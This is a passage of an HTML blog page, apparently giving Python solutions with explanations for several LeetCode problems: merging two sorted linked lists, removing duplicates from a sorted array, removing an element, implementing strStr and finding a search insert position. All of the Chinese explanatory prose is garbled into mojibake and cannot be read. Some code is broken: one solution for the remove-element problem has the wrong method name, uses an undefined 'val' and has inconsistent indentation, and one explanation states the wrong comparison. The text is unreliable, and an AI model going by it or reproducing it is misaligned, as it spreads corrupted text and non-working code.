<li>è¦è€ƒè™‘åˆ°<code>l1</code>æˆ–<code>l2</code>ä¸º<code>None</code>çš„æƒ…å†µä¸‹ï¼Œç›´æ¥è¿”å›éç©ºçš„é“¾è¡¨ã€‚</li>
<li>å°†ä¸¤ä¸ªé“¾è¡¨çš„å…ƒç´ ä¸­<code>val</code>åˆ†åˆ«å­˜å…¥ä¸¤ä¸ªåˆ—è¡¨ï¼Œæ‹¼æ¥è¿™ä¸¤ä¸ªåˆ—è¡¨åè¿›è¡Œæ’åºï¼ŒæŠŠæ’åºåçš„åˆ—è¡¨ä¸­çš„å…ƒç´ ç»„æˆä¸€ä¸ªæ–°çš„é“¾è¡¨ã€‚</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mergeTwoLists</span>(<span class="params">self, l1, l2</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type l1: ListNode</span></span><br><span class="line"><span class="string">        :type l2: ListNode</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> l1 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        	<span class="keyword">return</span> l2</span><br><span class="line">        <span class="keyword">if</span> l2 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        	<span class="keyword">return</span> l1</span><br><span class="line">        tmp1, tmp2 = [], []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> l1:</span><br><span class="line">        	tmp1.append(l1.val)</span><br><span class="line">        	l1 = l1.next</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> l2:</span><br><span class="line">        	tmp2.append(l2.val)</span><br><span class="line">        	l2 = l2.next</span><br><span class="line"></span><br><span class="line">        l3 = sorted(tmp1 + tmp2)</span><br><span class="line"></span><br><span class="line">        l = ListNode(l3[<span class="number">0</span>])</span><br><span class="line">        l.next = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        p = l</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(l3)):</span><br><span class="line">        	tmp = ListNode(l3[i])</span><br><span class="line">        	tmp.next = <span class="literal">None</span></span><br><span class="line">        	p.next = tmp</span><br><span class="line">        	p = tmp</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> l</span><br></pre></td></tr></table></figure>
<h4 id="æ–¹æ³•äºŒ-v6">æ–¹æ³•äºŒ</h4>
<p><strong>æ€è·¯</strong></p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬è®¾å®šä¸€ä¸ªå“¨å…µèŠ‚ç‚¹ <code>prehead</code> ï¼Œè¿™å¯ä»¥åœ¨æœ€åè®©æˆ‘ä»¬æ¯”è¾ƒå®¹æ˜“åœ°è¿”å›åˆå¹¶åçš„é“¾è¡¨ã€‚æˆ‘ä»¬ç»´æŠ¤ä¸€ä¸ª <code>prev</code> æŒ‡é’ˆï¼Œæˆ‘ä»¬éœ€è¦åšçš„æ˜¯è°ƒæ•´å®ƒçš„ <code>next</code> æŒ‡é’ˆã€‚ç„¶åï¼Œæˆ‘ä»¬é‡å¤ä»¥ä¸‹è¿‡ç¨‹ï¼Œç›´åˆ° <code>l1</code> æˆ–è€…<code>l2</code>æŒ‡å‘äº† <code>null </code>ï¼šå¦‚æœ <code>l1</code> å½“å‰ä½ç½®çš„å€¼å°äºç­‰äº <code>l2</code> ï¼Œæˆ‘ä»¬å°±æŠŠ<code> l1</code> çš„å€¼æ¥åœ¨ <code>prev</code> èŠ‚ç‚¹çš„åé¢åŒæ—¶å°† <code>l1</code> æŒ‡é’ˆå¾€åç§»ä¸€ä¸ªã€‚å¦åˆ™ï¼Œæˆ‘ä»¬å¯¹ <code>l2</code> åšåŒæ ·çš„æ“ä½œã€‚ä¸ç®¡æˆ‘ä»¬å°†å“ªä¸€ä¸ªå…ƒç´ æ¥åœ¨äº†åé¢ï¼Œæˆ‘ä»¬éƒ½æŠŠ<code>prev</code> å‘åç§»ä¸€ä¸ªå…ƒç´ ã€‚</p>
<p>åœ¨å¾ªç¯ç»ˆæ­¢çš„æ—¶å€™ï¼Œ<code> l1</code> å’Œ <code>l2</code> è‡³å¤šæœ‰ä¸€ä¸ªæ˜¯éç©ºçš„ã€‚ç”±äºè¾“å…¥çš„ä¸¤ä¸ªé“¾è¡¨éƒ½æ˜¯æœ‰åºçš„ï¼Œæ‰€ä»¥ä¸ç®¡å“ªä¸ªé“¾è¡¨æ˜¯éç©ºçš„ï¼Œå®ƒåŒ…å«çš„æ‰€æœ‰å…ƒç´ éƒ½æ¯”å‰é¢å·²ç»åˆå¹¶é“¾è¡¨ä¸­çš„æ‰€æœ‰å…ƒç´ éƒ½è¦å¤§ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬åªéœ€è¦ç®€å•åœ°å°†éç©ºé“¾è¡¨æ¥åœ¨åˆå¹¶é“¾è¡¨çš„åé¢ï¼Œå¹¶è¿”å›åˆå¹¶é“¾è¡¨ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mergeTwoLists</span>(<span class="params">self, l1, l2</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type l1: ListNode</span></span><br><span class="line"><span class="string">        :type l2: ListNode</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        prehead = ListNode(<span class="number">-1</span>)</span><br><span class="line">        </span><br><span class="line">        prev = prehead</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> l1 <span class="keyword">and</span> l2:</span><br><span class="line">            <span class="keyword">if</span> l1.val &lt;= l2.val:</span><br><span class="line">                prev.next = l1</span><br><span class="line">                l1 = l1.next</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                prev.next = l2</span><br><span class="line">                l2 = l2.next</span><br><span class="line">            prev = prev.next</span><br><span class="line">        </span><br><span class="line">        prev.next = l1 <span class="keyword">if</span> l1 <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> l2</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> prehead.next</span><br></pre></td></tr></table></figure>
<h3 id="Extra-v5">Extra</h3>
<ol>
<li>
<p>è¿æ¥ä¸¤ä¸ªåˆ—è¡¨ï¼š<code>list1 + list2</code></p>
</li>
<li>
<p><code>sort()</code>å’Œ<code>sorted()</code>çš„åŒºåˆ«</p>
<ul>
<li>
<p>sortæ˜¯å®¹å™¨çš„å‡½æ•°ï¼š<code>sort(cmp=None, key=None, reverse=False)</code></p>
<p>sortedæ˜¯pythonçš„å†…å»ºå‡½æ•°ï¼š<code>sorted(iterable, cmp=None, key=None, reverse=False)</code></p>
<p>å³ï¼š<strong>sort æ˜¯åº”ç”¨åœ¨ list ä¸Šçš„æ–¹æ³•ï¼Œsorted å¯ä»¥å¯¹æ‰€æœ‰å¯è¿­ä»£çš„å¯¹è±¡è¿›è¡Œæ’åºæ“ä½œã€‚</strong></p>
</li>
<li>
<p>å¯¹äºä¸€ä¸ªæ— åºçš„åˆ—è¡¨aï¼Œè°ƒç”¨a.sort()ï¼Œå¯¹aè¿›è¡Œæ’åºåè¿”å›aï¼Œsort()å‡½æ•°ä¿®æ”¹å¾…æ’åºçš„åˆ—è¡¨å†…å®¹ã€‚</p>
<p>è€Œå¯¹äºåŒæ ·ä¸€ä¸ªæ— åºçš„åˆ—è¡¨aï¼Œè°ƒç”¨sorted(a)ï¼Œå¯¹aè¿›è¡Œæ’åºåè¿”å›ä¸€ä¸ªæ–°çš„åˆ—è¡¨ï¼Œè€Œå¯¹aä¸äº§ç”Ÿå½±å“ã€‚</p>
</li>
<li>
<p>keyï¼šç”¨æ¥æŒ‡å®šä¸€ä¸ªå‡½æ•°ï¼Œæ­¤å‡½æ•°åœ¨æ¯æ¬¡å…ƒç´ æ¯”è¾ƒæ—¶è¢«è°ƒç”¨ï¼Œæ­¤å‡½æ•°ä»£è¡¨æ’åºçš„è§„åˆ™ï¼Œä¹Ÿå°±æ˜¯ä½ æŒ‰ç…§ä»€ä¹ˆè§„åˆ™å¯¹ä½ çš„åºåˆ—è¿›è¡Œæ’åºï¼›</p>
<p>reverseï¼šæ˜¯ç”¨æ¥è¡¨æ˜æ˜¯å¦é€†åºï¼Œé»˜è®¤çš„Falseæƒ…å†µä¸‹æ˜¯æŒ‰ç…§å‡åºçš„è§„åˆ™è¿›è¡Œæ’åºçš„ï¼Œå½“reverse=Trueæ—¶ï¼Œä¾¿ä¼šæŒ‰ç…§é™åºè¿›è¡Œæ’åºã€‚</p>
</li>
</ul>
</li>
</ol>
<h2 id="26-remove-duplicates-from-sorted-array">#26_remove-duplicates-from-sorted-array</h2>
<h3 id="Question-v8">Question</h3>
<p>ç»™å®šä¸€ä¸ªæ’åºæ•°ç»„ï¼Œä½ éœ€è¦åœ¨åŸåœ°åˆ é™¤é‡å¤å‡ºç°çš„å…ƒç´ ï¼Œä½¿å¾—æ¯ä¸ªå…ƒç´ åªå‡ºç°ä¸€æ¬¡ï¼Œè¿”å›ç§»é™¤åæ•°ç»„çš„æ–°é•¿åº¦ã€‚</p>
<p>ä¸è¦ä½¿ç”¨é¢å¤–çš„æ•°ç»„ç©ºé—´ï¼Œä½ å¿…é¡»åœ¨åŸåœ°ä¿®æ”¹è¾“å…¥æ•°ç»„å¹¶åœ¨ä½¿ç”¨ O(1) é¢å¤–ç©ºé—´çš„æ¡ä»¶ä¸‹å®Œæˆã€‚</p>
<blockquote>
<p>ä¸ºä»€ä¹ˆè¿”å›æ•°å€¼æ˜¯æ•´æ•°ï¼Œä½†è¾“å‡ºçš„ç­”æ¡ˆæ˜¯æ•°ç»„å‘¢?</p>
<p>è¯·æ³¨æ„ï¼Œè¾“å…¥æ•°ç»„æ˜¯ä»¥â€œå¼•ç”¨â€æ–¹å¼ä¼ é€’çš„ï¼Œè¿™æ„å‘³ç€åœ¨å‡½æ•°é‡Œä¿®æ”¹è¾“å…¥æ•°ç»„å¯¹äºè°ƒç”¨è€…æ˜¯å¯è§çš„ã€‚</p>
<p>ä½ å¯ä»¥æƒ³è±¡å†…éƒ¨æ“ä½œå¦‚ä¸‹:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; nums æ˜¯ä»¥â€œå¼•ç”¨â€æ–¹å¼ä¼ é€’çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸å¯¹å®å‚åšä»»ä½•æ‹·è´</span><br><span class="line">int len &#x3D; removeDuplicates(nums);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; åœ¨å‡½æ•°é‡Œä¿®æ”¹è¾“å…¥æ•°ç»„å¯¹äºè°ƒç”¨è€…æ˜¯å¯è§çš„ã€‚</span><br><span class="line">&#x2F;&#x2F; æ ¹æ®ä½ çš„å‡½æ•°è¿”å›çš„é•¿åº¦, å®ƒä¼šæ‰“å°å‡ºæ•°ç»„ä¸­è¯¥é•¿åº¦èŒƒå›´å†…çš„æ‰€æœ‰å…ƒç´ ã€‚</span><br><span class="line">for (int i &#x3D; 0; i &lt; len; i++) &#123;</span><br><span class="line">Â  Â  print(nums[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="Example-v8">Example</h3>
<p><strong>ç¤ºä¾‹1</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç»™å®šæ•°ç»„ nums &#x3D; [1,1,2], </span><br><span class="line"></span><br><span class="line">å‡½æ•°åº”è¯¥è¿”å›æ–°çš„é•¿åº¦ 2, å¹¶ä¸”åŸæ•°ç»„ nums çš„å‰ä¸¤ä¸ªå…ƒç´ è¢«ä¿®æ”¹ä¸º 1, 2ã€‚ </span><br><span class="line"></span><br><span class="line">ä½ ä¸éœ€è¦è€ƒè™‘æ•°ç»„ä¸­è¶…å‡ºæ–°é•¿åº¦åé¢çš„å…ƒç´ ã€‚</span><br><span class="line"></span><br><span class="line">æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;leetcode-cn.com&#x2F;problems&#x2F;remove-duplicates-from-sorted-array</span><br><span class="line">è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</span><br></pre></td></tr></table></figure>
<p><strong>ç¤ºä¾‹2</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç»™å®š nums &#x3D; [0,0,1,1,1,2,2,3,3,4],</span><br><span class="line"></span><br><span class="line">å‡½æ•°åº”è¯¥è¿”å›æ–°çš„é•¿åº¦ 5, å¹¶ä¸”åŸæ•°ç»„ nums çš„å‰äº”ä¸ªå…ƒç´ è¢«ä¿®æ”¹ä¸º 0, 1, 2, 3, 4ã€‚</span><br><span class="line"></span><br><span class="line">ä½ ä¸éœ€è¦è€ƒè™‘æ•°ç»„ä¸­è¶…å‡ºæ–°é•¿åº¦åé¢çš„å…ƒç´ ã€‚</span><br></pre></td></tr></table></figure>
<h3 id="Solution-v7">Solution</h3>
<p><strong>æ€è·¯</strong></p>
<p>æˆ‘ä»¬å¯ä»¥æ”¾ç½®ä¸¤ä¸ªæŒ‡é’ˆ<code>i</code>å’Œ<code>j</code>ï¼Œå…¶ä¸­<code>i</code>æ˜¯æ…¢æŒ‡é’ˆï¼Œè€Œ<code>j</code>æ˜¯å¿«æŒ‡é’ˆã€‚åªè¦ <code>nums[i] = nums[j]</code>ï¼Œæˆ‘ä»¬å°±å¢åŠ <code>j</code>ä»¥è·³è¿‡é‡å¤é¡¹ã€‚</p>
<p>å½“æˆ‘ä»¬é‡åˆ°<code>nums[i] = nums[j]</code>æ—¶ï¼Œè·³è¿‡é‡å¤é¡¹çš„è¿è¡Œå·²ç»ç»“æŸï¼Œå› æ­¤æˆ‘ä»¬å¿…é¡»æŠŠå®ƒ<code>nums[j]</code>çš„å€¼å¤åˆ¶åˆ° <code>nums[i + 1]</code>ã€‚ç„¶åé€’å¢<code>i</code>ï¼Œæ¥ç€æˆ‘ä»¬å°†å†æ¬¡é‡å¤ç›¸åŒçš„è¿‡ç¨‹ï¼Œç›´åˆ°<code>j</code>åˆ°è¾¾æ•°ç»„çš„æœ«å°¾ä¸ºæ­¢ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeDuplicates</span>(<span class="params">self, nums</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, len(nums)):</span><br><span class="line">        	<span class="keyword">if</span> nums[i] != nums[j]:</span><br><span class="line">        		i = i+<span class="number">1</span></span><br><span class="line">        		nums[i] = nums[j]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> i+<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h2 id="27-remove-element">#27_remove-element</h2>
<h3 id="Question-v9">Question</h3>
<p>ç»™å®šä¸€ä¸ªæ•°ç»„ nums å’Œä¸€ä¸ªå€¼ valï¼Œä½ éœ€è¦åŸåœ°ç§»é™¤æ‰€æœ‰æ•°å€¼ç­‰äº val çš„å…ƒç´ ï¼Œè¿”å›ç§»é™¤åæ•°ç»„çš„æ–°é•¿åº¦ã€‚</p>
<p>ä¸è¦ä½¿ç”¨é¢å¤–çš„æ•°ç»„ç©ºé—´ï¼Œä½ å¿…é¡»åœ¨åŸåœ°ä¿®æ”¹è¾“å…¥æ•°ç»„å¹¶åœ¨ä½¿ç”¨ O(1) é¢å¤–ç©ºé—´çš„æ¡ä»¶ä¸‹å®Œæˆã€‚</p>
<p>å…ƒç´ çš„é¡ºåºå¯ä»¥æ”¹å˜ã€‚ä½ ä¸éœ€è¦è€ƒè™‘æ•°ç»„ä¸­è¶…å‡ºæ–°é•¿åº¦åé¢çš„å…ƒç´ ã€‚</p>
<h3 id="Example-v9">Example</h3>
<p><strong>ç¤ºä¾‹ä¸€</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ç»™å®š nums = [<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>], val = <span class="number">3</span>,</span><br><span class="line"></span><br><span class="line">å‡½æ•°åº”è¯¥è¿”å›æ–°çš„é•¿åº¦ <span class="number">2</span>, å¹¶ä¸” nums ä¸­çš„å‰ä¸¤ä¸ªå…ƒç´ å‡ä¸º <span class="number">2</span>ã€‚</span><br><span class="line"></span><br><span class="line">ä½ ä¸éœ€è¦è€ƒè™‘æ•°ç»„ä¸­è¶…å‡ºæ–°é•¿åº¦åé¢çš„å…ƒç´ ã€‚</span><br></pre></td></tr></table></figure>
<p><strong>ç¤ºä¾‹äºŒ</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ç»™å®š nums = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">2</span>], val = <span class="number">2</span>,</span><br><span class="line"></span><br><span class="line">å‡½æ•°åº”è¯¥è¿”å›æ–°çš„é•¿åº¦ <span class="number">5</span>, å¹¶ä¸” nums ä¸­çš„å‰äº”ä¸ªå…ƒç´ ä¸º <span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>ã€‚</span><br><span class="line"></span><br><span class="line">æ³¨æ„è¿™äº”ä¸ªå…ƒç´ å¯ä¸ºä»»æ„é¡ºåºã€‚</span><br><span class="line"></span><br><span class="line">ä½ ä¸éœ€è¦è€ƒè™‘æ•°ç»„ä¸­è¶…å‡ºæ–°é•¿åº¦åé¢çš„å…ƒç´ ã€‚</span><br></pre></td></tr></table></figure>
<h3 id="Solution-v8">Solution</h3>
<h4 id="æ–¹æ³•ä¸€-v7">æ–¹æ³•ä¸€</h4>
<p><strong>æ€è·¯</strong></p>
<ol>
<li>é¦–å…ˆéå†å¾ªç¯<code>nums</code>ï¼Œå¹¶ä½¿ç”¨<code>count</code>æ¥è®¡æ•°æœ‰å¤šå°‘ä¸ªå¾…åˆ é™¤çš„å…ƒç´ ï¼›</li>
<li>å†æ‰§è¡Œ<code>count</code>æ¬¡<code>remove</code>å‡½æ•°åˆ é™¤<code>nums</code>ä¸­å€¼ä¸º<code>val</code>çš„å…ƒç´ </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeElement</span>(<span class="params">self, nums: List[int], val: int</span>) -&gt; int:</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">            <span class="keyword">if</span> nums[i] == val:</span><br><span class="line">                count = count+<span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(count):</span><br><span class="line">            nums.remove(val)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> len(nums)</span><br></pre></td></tr></table></figure>
<h4 id="æ–¹æ³•äºŒ-v7">æ–¹æ³•äºŒ</h4>
<p><strong>æ€è·¯</strong></p>
<blockquote>
<p>è¿™é“é¢˜çš„æ€è·¯å’Œ <a href="https://leetcode-cn.com/problems/remove-duplicates-from-sorted-array/solution/shan-chu-pai-xu-shu-zu-zhong-de-zhong-fu-xiang-by-/">åˆ é™¤æ’åºæ•°ç»„ä¸­çš„é‡å¤é¡¹</a>è§£æ³•ç±»ä¼¼</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeDuplicates</span>(<span class="params">self, nums</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">        	<span class="keyword">if</span> nums[j] != val:</span><br><span class="line">        		nums[i] = nums[j]</span><br><span class="line">                i = i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> i</span><br></pre></td></tr></table></figure>
<h2 id="28-implement-strstr">#28_implement-strstr</h2>
<h3 id="Question-v10">Question</h3>
<p>å®ç° <code>strStr()</code> å‡½æ•°ã€‚</p>
<p>ç»™å®šä¸€ä¸ª haystack å­—ç¬¦ä¸²å’Œä¸€ä¸ª needle å­—ç¬¦ä¸²ï¼Œåœ¨ haystack å­—ç¬¦ä¸²ä¸­æ‰¾å‡º needle å­—ç¬¦ä¸²å‡ºç°çš„ç¬¬ä¸€ä¸ªä½ç½® (ä»0å¼€å§‹)ã€‚å¦‚æœä¸å­˜åœ¨ï¼Œåˆ™è¿”å›  -1ã€‚</p>
<blockquote>
<p>è¯´æ˜:</p>
<p>å½“ needle æ˜¯ç©ºå­—ç¬¦ä¸²æ—¶ï¼Œæˆ‘ä»¬åº”å½“è¿”å›ä»€ä¹ˆå€¼å‘¢ï¼Ÿè¿™æ˜¯ä¸€ä¸ªåœ¨é¢è¯•ä¸­å¾ˆå¥½çš„é—®é¢˜ã€‚</p>
<p>å¯¹äºæœ¬é¢˜è€Œè¨€ï¼Œå½“ needle æ˜¯ç©ºå­—ç¬¦ä¸²æ—¶æˆ‘ä»¬åº”å½“è¿”å› 0 ã€‚è¿™ä¸Cè¯­è¨€çš„ strstr() ä»¥åŠ Javaçš„ indexOf() å®šä¹‰ç›¸ç¬¦ã€‚</p>
</blockquote>
<h3 id="Example-v10">Example</h3>
<p><strong>ç¤ºä¾‹ä¸€</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥: haystack &#x3D; &quot;hello&quot;, needle &#x3D; &quot;ll&quot;</span><br><span class="line">è¾“å‡º: 2</span><br></pre></td></tr></table></figure>
<p><strong>ç¤ºä¾‹äºŒ</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥: haystack &#x3D; &quot;aaaaa&quot;, needle &#x3D; &quot;bba&quot;</span><br><span class="line">è¾“å‡º: -1</span><br></pre></td></tr></table></figure>
<h3 id="Solution-v9">Solution</h3>
<h4 id="æ–¹æ³•ä¸€-v8">æ–¹æ³•ä¸€</h4>
<p><strong>æ€è·¯</strong></p>
<ol>
<li>è‹¥<code>needle</code>ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œåˆ™è¿”å›0ï¼›</li>
<li>è‹¥<code>needle</code>çš„é¦–å­—ç¬¦ä¸åœ¨<code>haystack</code>ä¸­ï¼Œåˆ™è¿”å›-1ï¼›</li>
<li>å¾ªç¯éå†<code>haystack</code>ï¼Œæ‰¾åˆ°<code>needle</code>é¦–å­—ç¬¦åœ¨<code>haystack</code>çš„èµ·å§‹ä½ç½®ï¼Œå‘åæ¯”è¾ƒ<code>needle_len</code>é•¿åº¦çš„å­å­—ç¬¦ä¸²ã€‚</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">strStr</span>(<span class="params">self, haystack: str, needle: str</span>) -&gt; int:</span></span><br><span class="line">        needle_len = len(needle)</span><br><span class="line">        <span class="keyword">if</span> needle_len == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        char = needle[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">not</span> <span class="keyword">in</span> haystack:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(haystack)):</span><br><span class="line">                <span class="keyword">if</span> char == haystack[i]:</span><br><span class="line">                    <span class="keyword">if</span> haystack[i:(i+needle_len)] == needle:</span><br><span class="line">                        <span class="keyword">return</span> i             </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure>
<h4 id="æ–¹æ³•äºŒ-v8">æ–¹æ³•äºŒ</h4>
<p><strong>æ€è·¯</strong></p>
<p>å’Œæ–¹æ³•ä¸€çš„æ€è·¯ç›¸ä¼¼ï¼Œåªæ˜¯ä»£ç å†™çš„æ›´ä¸ºç®€æ´ï¼Œä½†æ˜¯æ„Ÿè§‰æ›´ä¸ºæš´åŠ›ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">strStr</span>(<span class="params">self, haystack: str, needle: str</span>) -&gt; int:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(haystack) - len(needle)+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> haystack[i:i+len(needle)] == needle:</span><br><span class="line">                <span class="keyword">return</span> i</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure>
<h2 id="35-search-insert-position">#35_search_insert_position</h2>
<h3 id="Question-v11">Question</h3>
<p>ç»™å®šä¸€ä¸ªæ’åºæ•°ç»„å’Œä¸€ä¸ªç›®æ ‡å€¼ï¼Œåœ¨æ•°ç»„ä¸­æ‰¾åˆ°ç›®æ ‡å€¼ï¼Œå¹¶è¿”å›å…¶ç´¢å¼•ã€‚å¦‚æœç›®æ ‡å€¼ä¸å­˜åœ¨äºæ•°ç»„ä¸­ï¼Œè¿”å›å®ƒå°†ä¼šè¢«æŒ‰é¡ºåºæ’å…¥çš„ä½ç½®ã€‚</p>
<p>ä½ å¯ä»¥å‡è®¾æ•°ç»„ä¸­æ— é‡å¤å…ƒç´ ã€‚</p>
<h3 id="Example-v11">Example</h3>
<p><strong>ç¤ºä¾‹ä¸€</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥: [1,3,5,6], 5</span><br><span class="line">è¾“å‡º: 2</span><br></pre></td></tr></table></figure>
<p><strong>ç¤ºä¾‹äºŒ</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥: [1,3,5,6], 2</span><br><span class="line">è¾“å‡º: 1</span><br></pre></td></tr></table></figure>
<p><strong>ç¤ºä¾‹ä¸‰</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥: [1,3,5,6], 7</span><br><span class="line">è¾“å‡º: 4</span><br></pre></td></tr></table></figure>
<h3 id="Solution-v10">Solution</h3>
<h4 id="æ–¹æ³•ä¸€-v9">æ–¹æ³•ä¸€</h4>
<p><strong>æ€è·¯</strong></p>
<ol>
<li>å¦‚æœ<code>target</code>åœ¨<code>nums</code>ä¸­ï¼Œåˆ™ç›´æ¥è¿”å›ç´¢å¼•ï¼›</li>
<li>å¦åˆ™å°†<code>target</code>æ·»åŠ åœ¨<code>nums</code>åˆ—è¡¨åé¢ï¼Œå†å¯¹å…¶è¿›è¡Œæ’åºï¼Œæœ€åè¿”å›ç´¢å¼•ã€‚</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">searchInsert</span>(<span class="params">self, nums: List[int], target: int</span>) -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> target <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">return</span> nums.index(target)</span><br><span class="line">        nums.append(target)</span><br><span class="line">        nums.sort()</span><br><span class="line">        <span class="keyword">return</span> nums.index(target)</span><br></pre></td></tr></table></figure>
<blockquote>
